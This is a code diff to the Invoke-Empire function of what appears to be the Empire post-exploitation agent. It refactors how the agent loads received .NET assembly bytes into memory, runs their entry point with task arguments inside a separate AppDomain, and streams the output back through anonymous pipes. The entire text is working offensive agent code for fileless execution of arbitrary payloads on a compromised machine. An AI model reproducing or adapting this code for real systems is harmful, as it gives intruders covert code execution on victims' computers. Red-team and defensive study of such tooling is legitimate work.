@@ -1031,60 +1031,60 @@ function Invoke-Empire {
                         $bytesRead = $sr.Read($buffer, 0, $buffer.Length);
                     }
                     $assemBytes = $output.ToArray();
-                    $assembly = [Reflection.Assembly]::Load($assemBytes)
-
-                    $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable);
-                    $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle);
-
-                    $ps = [PowerShell]::Create();
-                    $dict = @{
-                        "assembly" = $assembly;
-                        "args"     = $commandArray;
-                        "pipe"     = $pipeClientStream;
-                    }
-
-                    $task = $ps.AddScript('
-                        [CmdletBinding()]
-                        param(
-                            [System.Reflection.Assembly]
-                            $assembly,
-
-                            [String[]]
-                            $args,
-
-                            [IO.Pipes.AnonymousPipeClientStream]
-                            $pipe
-                        )
-
-                        try {
-                            $writer = New-Object System.IO.StreamWriter($pipe)
-                            $writer.AutoFlush = $true
-                            $writer.WriteLine("ready")
-
-                            Start-Sleep -Milliseconds 1000
-
-                            $arguments = @(,[string[]]$args)
-                            $streamProp = $assembly.GetType("Program").GetProperty("OutputStream")
-                            if ($streamProp) {
-                                $streamProp.SetValue($null, $pipe, $null)
-                            }
-
-                            $pipeWriter = New-Object System.IO.StreamWriter($pipe)
-                            $pipeWriter.AutoFlush = $true
-                            $originalConsoleOut = [Console]::Out
-                            [Console]::SetOut($pipeWriter)
-
-                            $assembly.EntryPoint.Invoke($null, $arguments)
-                        }
-                        finally {
-                            $pipe.Dispose()
-                            [Console]::SetOut($originalConsoleOut)
-                        }
-                    ').AddParameters($dict).BeginInvoke()
 
                     $scriptString = {
-                        param($pipeServerStream, $ps, $task)
+                        param($assemBytes, $commandArray)
                         try {
+                            $assembly = [Reflection.Assembly]::Load($assemBytes)
+                            $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable);
+                            $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle);
+
+                            $ps = [PowerShell]::Create();
+                            $dict = @{
+                                "assembly" = $assembly;
+                                "args"     = $commandArray;
+                                "pipe"     = $pipeClientStream;
+                            }
+
+                            $task = $ps.AddScript('
+                                [CmdletBinding()]
+                                param(
+                                    [System.Reflection.Assembly]
+                                    $assembly,
+
+                                    [String[]]
+                                    $args,
+
+                                    [IO.Pipes.AnonymousPipeClientStream]
+                                    $pipe
+                                )
+
+                                try {
+                                    $writer = New-Object System.IO.StreamWriter($pipe)
+                                    $writer.AutoFlush = $true
+                                    $writer.WriteLine("ready")
+
+                                    Start-Sleep -Milliseconds 1000
+
+                                    $arguments = @(,[string[]]$args)
+                                    $streamProp = $assembly.GetType("Program").GetProperty("OutputStream")
+                                    if ($streamProp) {
+                                        $streamProp.SetValue($null, $pipe, $null)
+                                    }
+
+                                    $pipeWriter = New-Object System.IO.StreamWriter($pipe)
+                                    $pipeWriter.AutoFlush = $true
+                                    $originalConsoleOut = [Console]::Out
+                                    [Console]::SetOut($pipeWriter)
+
+                                    $assembly.EntryPoint.Invoke($null, $arguments)
+                                }
+                                finally {
+                                    $pipe.Dispose()
+                                    [Console]::SetOut($originalConsoleOut)
+                                }
+                            ').AddParameters($dict).BeginInvoke()
+
                             $outputCollector = [Text.StringBuilder]::new()
                             $streamReader = New-Object System.IO.StreamReader($pipeServerStream)
                             $readyMessage = $streamReader.ReadLine()
@@ -1094,29 +1094,22 @@ function Invoke-Empire {
                                 while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
                                     if ($read -gt 0) {
                                         $outputChunk = -join $buffer[0..($read - 1)]
-                                        [void]$outputCollector.Append($outputChunk)
+                                        $outputChunk
                                     }
-                                }
-
-                                # Send full output after pipe closes
-                                $output = $outputCollector.ToString().TrimEnd()
-                                if (-not [string]::IsNullOrWhiteSpace($output)) {
-                                    $output
                                 }
                             }
                         }
                         finally {
-                            $ps.EndInvoke($task)
-                            $script:tasks[$ResultID]['status'] = 'completed';
+                            if ($ps) { $ps.EndInvoke($task); $ps.Dispose() }
+                            if ($pipeServerStream) { $pipeServerStream.Dispose() }
                         }
                     }
 
                     $AppDomain = [AppDomain]::CreateDomain($ResultID);
                     $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create();
                     $parameters = @{
-                        "pipeServerStream" = $pipeServerStream;
-                        "ps"               = $ps;
-                        "task"             = $task;
+                        "assemBytes"   = $assemBytes;
+                        "commandArray" = $commandArray;
                     }
 
                     $null = $PSHost.AddScript($ScriptString).AddParameters($parameters)
